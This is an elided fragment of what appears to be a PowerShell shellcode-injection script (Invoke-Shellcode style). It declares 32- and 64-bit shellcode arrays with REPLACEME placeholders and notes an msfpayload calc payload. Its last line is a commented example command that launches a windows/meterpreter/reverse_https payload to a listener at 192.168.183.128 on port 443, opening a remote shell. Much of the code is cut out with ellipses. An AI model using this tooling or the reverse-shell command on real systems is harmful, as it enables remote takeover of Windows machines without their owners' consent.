...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    else
    {
        ...
        [Byte[]] $Shellcode32 = @(REPLACEME32)

        # 64-bit payload
        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
        [Byte[]] $Shellcode64 = @(REPLACEME64)
    }
...
#Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.183.128 -Lport 443 -Verbose -Force
